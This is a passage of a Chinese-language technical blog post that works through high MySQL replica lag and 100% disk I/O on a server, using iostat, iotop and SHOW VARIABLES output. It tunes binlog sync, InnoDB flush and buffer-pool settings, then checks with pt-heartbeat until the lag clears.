class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[root@server-6 ~]# iostat -d -x 2</span><br><span class="line">Linux 3.10.0-693.el7.x86_64 (server-6) 08/20/2018 _x86_64_(56 CPU)</span><br><span class="line"></span><br><span class="line">Device:         rrqm/s   wrqm/s     r/s     w/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await r_await w_await  svctm  %util</span><br><span class="line">sda               1.06    14.14   80.26 1964.48  6209.75 19539.84    25.19     0.79    0.38   10.58    0.47   0.18  37.16</span><br><span class="line">dm-0              0.00     0.00   80.18 1977.08  6205.01 19533.60    25.02     0.07    0.04    0.45    0.02   0.18  37.17</span><br><span class="line">dm-1              0.00     0.00    1.18    1.56     4.74     6.23     8.00     0.03   11.99    4.65   17.57   0.12   0.03</span><br><span class="line"></span><br><span class="line">Device:         rrqm/s   wrqm/s     r/s     w/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await r_await w_await  svctm  %util</span><br><span class="line">sda               0.00    86.50  294.50 2278.00 22820.00 38805.75    47.91    19.72    7.54   58.32    0.98   0.39 100.00</span><br><span class="line">dm-0              0.00     0.00  296.50 2327.00 22852.00 38221.75    46.56    20.08    7.54   57.92    1.12   0.38  99.95</span><br><span class="line">dm-1              0.00     0.00    0.00    0.00     0.00     0.00     0.00     0.00    0.00    0.00    0.00   0.00   0.00</span><br><span class="line"></span><br><span class="line">Device:         rrqm/s   wrqm/s     r/s     w/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await r_await w_await  svctm  %util</span><br><span class="line">sda               0.00    31.50  497.00 2887.00 38196.00 42797.50    47.87    14.84    4.59   29.85    0.24   0.30 100.00</span><br><span class="line">dm-0              0.00     0.00  491.50 2918.50 37828.00 42797.50    47.29    14.88    4.56   30.19    0.25   0.29 100.00</span><br><span class="line">dm-1              0.00     0.00    0.00    0.00     0.00     0.00     0.00     0.00    0.00    0.00    0.00   0.00   0.00</span><br><span class="line"></span><br><span class="line">Device:         rrqm/s   wrqm/s     r/s     w/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await r_await w_await  svctm  %util</span><br><span class="line">sda               0.00     0.00  433.50 2135.00 34016.00 61046.25    74.02    11.60    3.98   17.68    1.20   0.39  99.85</span><br><span class="line">dm-0              0.00     0.00  439.50 2136.00 34680.00 61052.25    74.34    11.61    3.97   17.43    1.20   0.39  99.90</span><br><span class="line">dm-1              0.00     0.00    0.00    0.00     0.00     0.00     0.00     0.00    0.00    0.00    0.00   0.00   0.00</span><br><span class="line"></span><br><span class="line">Device:         rrqm/s   wrqm/s     r/s     w/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await r_await w_await  svctm  %util</span><br><span class="line">sda               0.00     0.00  828.00 1987.00 61214.00 21236.25    58.58    11.50    4.56   15.08    0.17   0.36  99.95</span><br><span class="line">dm-0              0.00     0.00  824.00 1986.00 60774.00 21230.25    58.37    11.52    4.57   15.15    0.18   0.36 100.00</span><br><span class="line">dm-1              0.00     0.00    0.00    0.00     0.00     0.00     0.00     0.00    0.00    0.00    0.00   0.00   0.00</span><br></pre></td></tr></table></figure><p>磁盘IO负载已经达到了100%.</p><p>6.查看占用磁盘IO的主要进程:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Total DISK READ :      25.90 M/s | Total DISK WRITE :   64.71 M/s</span><br><span class="line">Actual DISK READ:      27.85 M/s | Actual DISK WRITE:   52.46 M/s</span><br><span class="line">   TID  PRIO  USER     DISK READ  DISK WRITE  SWAPIN     IO&gt;    COMMAND</span><br><span class="line"> 93677 be/4 mysql    1280.78 K/s   54.50 K/s  0.00 % 89.19 % mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line">124925 be/4 mysql       5.30 M/s  735.77 K/s  0.00 % 86.79 % mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line"> 86834 be/4 mysql    1853.04 K/s  711.92 K/s  0.00 % 85.62 % mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line">124935 be/4 mysql       2.83 M/s  817.52 K/s  0.00 % 77.32 % mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line">127362 be/4 mysql    1825.79 K/s  545.01 K/s  0.00 % 74.37 % mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line">124928 be/4 mysql       3.94 M/s  517.76 K/s  0.00 % 74.02 % mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line"> 31008 be/4 mysql       2.20 M/s  531.39 K/s  0.00 % 72.05 % mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line"> 30965 be/4 mysql     572.26 K/s  180.54 K/s  0.00 % 68.54 % mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line"> 54715 be/4 mysql       3.67 M/s 1062.77 K/s  0.00 % 67.73 % mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line"> 30967 be/4 mysql     545.01 K/s  953.77 K/s  0.00 % 57.04 % mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line"> 30966 be/4 mysql    1021.90 K/s 1086.62 K/s  0.00 % 44.76 % mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line"> 30968 be/4 mysql     803.89 K/s  909.49 K/s  0.00 % 33.53 % mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line"> 23438 be/4 mysql     136.25 K/s 1216.06 K/s  0.00 %  4.78 % mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line"> 30948 be/4 mysql       0.00 B/s    0.00 B/s  0.00 %  3.82 % mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line"> 30945 be/4 mysql       0.00 B/s    0.00 B/s  0.00 %  1.16 % mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid</span><br><span class="line"> 30949 be/4 mysql       0.00 B/s   36.62 M/s  0.00 %  0.42 % mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid</span><br></pre></td></tr></table></figure><p>7.查看mysql有关磁盘IO的主要配置参数:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &apos;%sync_bin%&apos;;</span><br><span class="line">+---------------+-------+</span><br><span class="line">| Variable_name | Value |</span><br><span class="line">+---------------+-------+</span><br><span class="line">| sync_binlog   | 1     |</span><br><span class="line">+---------------+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show variables like &apos;%innodb_flush%&apos;;</span><br><span class="line">+--------------------------------+-------+</span><br><span class="line">| Variable_name                  | Value |</span><br><span class="line">+--------------------------------+-------+</span><br><span class="line">| innodb_flush_log_at_timeout    | 1     |</span><br><span class="line">| innodb_flush_log_at_trx_commit | 1     |</span><br><span class="line">| innodb_flush_method            |       |</span><br><span class="line">| innodb_flush_neighbors         | 1     |</span><br><span class="line">| innodb_flush_sync              | ON    |</span><br><span class="line">| innodb_flushing_avg_loops      | 30    |</span><br><span class="line">+--------------------------------+-------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>sync_binlog=1表示每次事务提交后MySQL将进行一次fsync之类的磁盘同步指令来将binlog_cache中的数据强制写入磁盘，频繁的写盘导致磁盘IO居高不下 </p><p>innodb_flush_log_at_trx_commit=1时,log buffer 会被写入到日志文件并刷写到磁盘。这也是默认值。这是最安全的配置，但由于每次事务都需要进行磁盘I/O，所以也最慢 </p><p>有关这两个参数的更多解释,请百度</p><p>8.修改参数配置:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">编辑my.cnf配置文件:</span><br><span class="line">[root@server-6 ~]# vim /etc/my.cnf</span><br><span class="line">sync_binlog=0</span><br><span class="line">innodb_flush_log_at_trx_commit=2</span><br></pre></td></tr></table></figure><p>9.重启mysql服务,重启slave进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@server-6 ~]# service mysqld restart</span><br><span class="line"></span><br><span class="line">[root@server-6 ~]# mysql -uroot -p</span><br><span class="line">Enter password:</span><br><span class="line">mysql&gt; start slave;</span><br><span class="line">Query OK, 0 rows affected, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure><p>10.查看参数是否已经生效:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &apos;%sync_bin%&apos;;</span><br><span class="line">+---------------+-------+</span><br><span class="line">| Variable_name | Value |</span><br><span class="line">+---------------+-------+</span><br><span class="line">| sync_binlog   | 0     |</span><br><span class="line">+---------------+-------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show variables like &apos;%innodb_flush%&apos;;</span><br><span class="line">+--------------------------------+-------+</span><br><span class="line">| Variable_name                  | Value |</span><br><span class="line">+--------------------------------+-------+</span><br><span class="line">| innodb_flush_log_at_timeout    | 1     |</span><br><span class="line">| innodb_flush_log_at_trx_commit | 2     |</span><br><span class="line">| innodb_flush_method            |       |</span><br><span class="line">| innodb_flush_neighbors         | 1     |</span><br><span class="line">| innodb_flush_sync              | ON    |</span><br><span class="line">| innodb_flushing_avg_loops      | 30    |</span><br><span class="line">+--------------------------------+-------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>11.但是查看磁盘IO还是居高不下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[root@server-6 mysql]# iostat -d -x 2</span><br><span class="line">Linux 3.10.0-693.el7.x86_64 (server-6) 08/20/2018 _x86_64_(56 CPU)</span><br><span class="line"></span><br><span class="line">Device:         rrqm/s   wrqm/s     r/s     w/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await r_await w_await  svctm  %util</span><br><span class="line">sda               1.06    14.18   80.43 1966.48  6216.32 19621.73    25.25     0.80    0.39   10.68    0.47   0.18  37.31</span><br><span class="line">dm-0              0.00     0.00   80.35 1979.12  6211.59 19615.51    25.08     0.09    0.04    0.60    0.02   0.18  37.33</span><br><span class="line">dm-1              0.00     0.00    1.18    1.55     4.73     6.22     8.00     0.03   11.99    4.65   17.57   0.12   0.03</span><br><span class="line"></span><br><span class="line">Device:         rrqm/s   wrqm/s     r/s     w/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await r_await w_await  svctm  %util</span><br><span class="line">sda               0.00     0.00   44.50 3126.00  1534.00 67250.50    43.39     3.18    1.10   51.88    0.38   0.31  96.95</span><br><span class="line">dm-0              0.00     0.00   44.00 3126.50  1526.00 67258.50    43.39     3.17    1.10   52.47    0.37   0.31  96.75</span><br><span class="line">dm-1              0.00     0.00    0.00    0.00     0.00     0.00     0.00     0.00    0.00    0.00    0.00   0.00   0.00</span><br><span class="line"></span><br><span class="line">Device:         rrqm/s   wrqm/s     r/s     w/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await r_await w_await  svctm  %util</span><br><span class="line">sda               0.00     0.00    7.50 3152.50   600.00 51644.00    33.07     2.69    0.87   81.47    0.68   0.30  94.10</span><br><span class="line">dm-0              0.00     0.00    7.50 3152.00   600.00 51636.00    33.07     2.69    0.87   81.47    0.67   0.30  94.00</span><br><span class="line">dm-1              0.00     0.00    0.00    0.00     0.00     0.00     0.00     0.00    0.00    0.00    0.00   0.00   0.00</span><br><span class="line"></span><br><span class="line">Device:         rrqm/s   wrqm/s     r/s     w/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await r_await w_await  svctm  %util</span><br><span class="line">sda               0.00     0.00   30.00 2915.00  1334.00 53757.25    37.41     3.74    1.27   36.00    0.91   0.30  88.95</span><br><span class="line">dm-0              0.00     0.00   30.50 2915.00  1398.00 53757.25    37.45     3.73    1.27   35.43    0.91   0.30  88.80</span><br><span class="line">dm-1              0.00     0.00    0.00    0.00     0.00     0.00     0.00     0.00    0.00    0.00    0.00   0.00   0.00</span><br><span class="line"></span><br><span class="line">Device:         rrqm/s   wrqm/s     r/s     w/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await r_await w_await  svctm  %util</span><br><span class="line">sda               0.00     0.00   66.50 3325.00  1656.00 65172.75    39.41     3.91    1.15   46.50    0.24   0.29  99.15</span><br><span class="line">dm-0              0.00     0.00   66.50 3325.00  1600.00 65172.75    39.38     3.90    1.14   46.50    0.24   0.29  99.10</span><br><span class="line">dm-1              0.00     0.00    0.00    0.00     0.00     0.00     0.00     0.00    0.00    0.00    0.00   0.00   0.00</span><br></pre></td></tr></table></figure><p>此外,延时仍然在不断的上升,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@server-6 mysql]# /usr/bin/pt-heartbeat --host=127.0.0.1 --user=heartbeat --password=xxxxxx -D dwd_analystic  --master-server-id=63306  --check</span><br><span class="line">94110.00</span><br></pre></td></tr></table></figure><p>12.但是查看slave状态.仍然在不停的读取bin日志和log信息.但是读取速度非常慢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show slave status\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">               Slave_IO_State: Waiting for master to send event</span><br><span class="line">                  Master_Host: 10.81.61.101</span><br><span class="line">                  Master_User: repl</span><br><span class="line">                  Master_Port: 3306</span><br><span class="line">                Connect_Retry: 60</span><br><span class="line">              Master_Log_File: mysql-bin.005029</span><br><span class="line">          Read_Master_Log_Pos: 195990517</span><br><span class="line">               Relay_Log_File: server-6-relay-bin.004900</span><br><span class="line">                Relay_Log_Pos: 983195495</span><br><span class="line">        Relay_Master_Log_File: mysql-bin.004930</span><br><span class="line">             Slave_IO_Running: Yes</span><br><span class="line">            Slave_SQL_Running: Yes</span><br><span class="line">              Replicate_Do_DB: dwd_analystic,hsq_sync_RDS</span><br><span class="line">          Replicate_Ignore_DB:</span><br><span class="line">           Replicate_Do_Table:</span><br><span class="line">       Replicate_Ignore_Table:</span><br><span class="line">      Replicate_Wild_Do_Table:</span><br><span class="line">  Replicate_Wild_Ignore_Table:</span><br><span class="line">                   Last_Errno: 0</span><br><span class="line">                   Last_Error:</span><br><span class="line">                 Skip_Counter: 0</span><br><span class="line">          Exec_Master_Log_Pos: 983195282</span><br><span class="line">              Relay_Log_Space: 106561330708</span><br><span class="line">              Until_Condition: None</span><br><span class="line">               Until_Log_File:</span><br><span class="line">                Until_Log_Pos: 0</span><br><span class="line">           Master_SSL_Allowed: No</span><br><span class="line">           Master_SSL_CA_File:</span><br><span class="line">           Master_SSL_CA_Path:</span><br><span class="line">              Master_SSL_Cert:</span><br><span class="line">            Master_SSL_Cipher:</span><br><span class="line">               Master_SSL_Key:</span><br><span class="line">        Seconds_Behind_Master: 94159</span><br></pre></td></tr></table></figure><p>13.查看mysql数据文件的binlog日志文件个数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@server-6 mysql]# ls server-6-relay-bin.* | wc -l</span><br><span class="line">301</span><br></pre></td></tr></table></figure><hr><p>14.优化完sync磁盘写入机制后发现延时还是非常高,而且在不断上升,最高的时候达到了34个小时.slave读取binlog日志还是非常慢.  </p><p>查看一下mysql数据库的关键性能配置参数,发现没有经过任何优化.这极大的限制了mysql的性能.</p><p>编辑my.cnf配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sync_binlog=0</span><br><span class="line">innodb_flush_log_at_trx_commit=2</span><br><span class="line">innodb_buffer_pool_size=100G</span><br><span class="line">innodb_page_cleaners=2</span><br><span class="line">innodb_log_file_size=1G</span><br></pre></td></tr></table></figure><p>重启mysql服务,启动slave进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service mysqld restart</span><br><span class="line">mysql -uroot -p</span><br><span class="line">mysql&gt; start slave;</span><br></pre></td></tr></table></figure><p>下面是修改过后的部分配置参数:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#下面的参数是最关键的性能指标.默认值是148M.一般建议是服务器内存的70%-75%</span><br><span class="line">由于我服务器是189G的内存,考虑到其他耗内存的进程,所以设置为100G</span><br><span class="line"></span><br><span class="line">mysql&gt; show variables like &quot;innodb_buffer_pool_size%&quot;;</span><br><span class="line">+-------------------------+--------------+</span><br><span class="line">| Variable_name           | Value        |</span><br><span class="line">+-------------------------+--------------+</span><br><span class="line">| innodb_buffer_pool_size | 107374182400 |</span><br><span class="line">+-------------------------+--------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">#Instances参数和上面的pool_size相关联.这个是自动设置的.</span><br><span class="line"></span><br><span class="line">mysql&gt; show variables like &quot;innodb_buffer_pool_instances&quot;;</span><br><span class="line">+------------------------------+-------+</span><br><span class="line">| Variable_name                | Value |</span><br><span class="line">+------------------------------+-------+</span><br><span class="line">| innodb_buffer_pool_instances | 8     |</span><br><span class="line">+------------------------------+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">#下面是日志的参数.log_file_size定义了日志文件的大小,这个值调高为好</span><br><span class="line"></span><br><span class="line">mysql&gt; show variables like &quot;innodb_log_file%&quot;;</span><br><span class="line">+---------------------------+------------+</span><br><span class="line">| Variable_name             | Value      |</span><br><span class="line">+---------------------------+------------+</span><br><span class="line">| innodb_log_file_size      | 1073741824 |</span><br><span class="line">| innodb_log_files_in_group | 2          |</span><br><span class="line">+---------------------------+------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>有关mysql的参数的配置和优化.请参考mysql的官方文档:<a href="https://dev.mysql.com/doc/refman/5.7/en/server-option-variable-reference.html" target="_blank" rel="noopener">Server Option, System Variable, and Status Variable Reference</a></p><hr><p>此时,虽然延时还在上涨.但是slave读取binlog日志的速度明显快了很多,相比之前同步速度几乎是指数级的翻倍上涨.性能大幅提升.而且从库上的binlog日志文件在不断减少.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Binlog文件从300多个在逐渐减少:</span><br><span class="line">[root@server-6 ~]# ls /data/mysql/server-6-relay-bin.*  | wc -l</span><br><span class="line">243</span><br></pre></td></tr></table></figure></p><p>观察了1天之后,日志文件进一步减少,而且延时在不断的最近</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@server-6 ~]# /usr/bin/pt-heartbeat --host=127.0.0.1 --user=heartbeat --password=xxxx -D dwd_analystic  --master-server-id=63306  --check</span><br><span class="line">124563.00</span><br><span class="line">[root@server-6 ~]# /usr/bin/pt-heartbeat --host=127.0.0.1 --user=heartbeat --password=xxxx -D dwd_analystic  --master-server-id=63306  --check</span><br><span class="line">124547.00</span><br><span class="line">[root@server-6 ~]# /usr/bin/pt-heartbeat --host=127.0.0.1 --user=heartbeat --password=xxxx -D dwd_analystic  --master-server-id=63306  --check</span><br><span class="line">124532.00</span><br><span class="line">[root@server-6 ~]# ls /data/mysql/server-6-relay-bin.*  | wc -l</span><br><span class="line">183</span><br></pre></td></tr></table></figure><p>再观察一个晚上后,延时故障消失,主从恢复正常.binlog文件几乎读完了.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@server-6 ~]# ls /data/mysql/server-6-relay-bin.*  | wc -l</span><br><span class="line">3</span><br><span class="line">[root@server-6 ~]# /usr/bin/pt-heartbeat --host=127.0.0.1 --user=heartbeat --password=xxxx -D dwd_analystic  --master-server-id=63306  --check</span><br><span class="line">1.00</span><br></pre></td></tr></table></figure><p>奇怪的是磁盘的IO负载还是非常高:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[root@server-6 ~]# iostat -d -x 2</span><br><span class="line">Linux 3.10.0-693.el7.x86_64 (server-6) 08/22/2018 _x86_64_(56 CPU)</span><br><span class="line"></span><br><span class="line">Device:         rrqm/s   wrqm/s     r/s     w/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await r_await w_await  svctm  %util</span><br><span class="line">sda               3.05    18.97   82.57 1959.78  6145.11 20097.05    25.70     0.02    0.01    0.10    0.00   0.19  39.06</span><br><span class="line">dm-0              0.00     0.00   82.12 1972.87  6130.89 20073.49    25.50     0.27    0.13    1.96    0.05   0.19  38.91</span><br><span class="line">dm-1              0.00     0.00    3.55    5.89    14.21    23.56     8.00     0.23   24.24   22.84   25.08   0.79   0.74</span><br><span class="line"></span><br><span class="line">Device:         rrqm/s   wrqm/s     r/s     w/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await r_await w_await  svctm  %util</span><br><span class="line">sda              55.50    72.50  218.50 1409.50  1272.00 12573.00    17.01     3.45    1.91   13.30    0.15   0.61  99.85</span><br><span class="line">dm-0              0.00     0.00  207.00 1482.00  1018.00 12573.00    16.09     3.25    1.73   12.88    0.18   0.59  99.70</span><br><span class="line">dm-1              0.00     0.00   68.50    0.00   274.00     0.00     8.00     1.21   16.61   16.61    0.00   2.69  18.40</span><br><span class="line"></span><br><span class="line">Device:         rrqm/s   wrqm/s     r/s     w/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await r_await w_await  svctm  %util</span><br><span class="line">sda              51.50     0.00  144.50 1809.00  1120.00 12491.25    13.94     2.95    1.69   19.88    0.24   0.51  99.80</span><br><span class="line">dm-0              0.00     0.00  136.50 1809.00   866.00 12491.25    13.73     2.63    1.53   18.63    0.24   0.51  99.70</span><br><span class="line">dm-1              0.00     0.00   58.50    0.00   234.00     0.00     8.00     2.47   43.60   43.60    0.00   5.34  31.25</span><br><span class="line"></span><br><span class="line">Device:         rrqm/s   wrqm/s     r/s     w/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await r_await w_await  svctm  %util</span><br><span class="line">sda              46.00    67.00  186.00 1726.00  1354.00 13791.75    15.84     2.73    1.25   11.63    0.13   0.52  99.50</span><br><span class="line">dm-0              0.00     0.00  179.50 1793.00  1158.00 13791.75    15.16     2.49    1.15   11.18    0.15   0.50  99.45</span><br><span class="line">dm-1              0.00     0.00   53.50    0.00   214.00     0.00     8.00     2.14   21.75   21.75    0.00   4.38  23.45</span><br></pre></td></tr></table></figure><p>但是磁盘的读写速度并不高,而且是es和kafka进程在消耗磁盘IO.并不是mysql进程了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Total DISK READ :     131.73 K/s | Total DISK WRITE :   11.93 M/s</span><br><span class="line">Actual DISK READ:     185.77 K/s | Actual DISK WRITE:   16.11 M/s</span><br><span class="line">   TID  PRIO  USER     DISK READ  DISK WRITE  SWAPIN     IO&gt;    COMMAND</span><br><span class="line">   305 be/4 root        0.00 B/s    0.00 B/s  0.00 % 88.69 % [kswapd0]</span><br><span class="line">117157 be/4 hadoop     50.66 K/s    3.38 K/s  0.00 %  8.19 % java -Xmx64G -Xms64G -server -XX:+UseG1GC -~a.Kafka /opt/kafka/config/server.properties</span><br><span class="line">140979 be/4 hadoop      0.00 B/s  118.22 K/s  0.00 %  6.71 % java -Xms24g -Xmx24g -XX:+UseConcMarkSweepG~rg.elasticsearch.bootstrap.Elasticsearch -d</span><br><span class="line">140960 be/4 hadoop      0.00 B/s   50.66 K/s  0.00 %  0.38 % java -Xms24g -Xmx24g -XX:+UseConcMarkSweepG~rg.elasticsearch.bootstrap.Elasticsearch -d</span><br><span class="line">140449 be/4 hadoop      0.00 B/s  148.61 K/s  0.00 %  0.26 % java -Xms24g -Xmx24g -XX:+UseConcMarkSweepG~rg.elasticsearch.bootstrap.Elasticsearch -d</span><br><span class="line">140974 be/4 hadoop      0.00 B/s  138.48 K/s  0.00 %  0.26 % java -Xms24g -Xmx24g -XX:+UseConcMarkSweepG~rg.elasticsearch.bootstrap.Elasticsearch -d</span><br><span class="line">140980 be/4 hadoop      0.00 B/s  141.86 K/s  0.00 %  0.25 % java -Xms24g -Xmx24g -XX:+UseConcMarkSweepG~rg.elasticsearch.bootstrap.Elasticsearch -d</span><br><span class="line">140973 be/4 hadoop      0.00 B/s  145.24 K/s  0.00 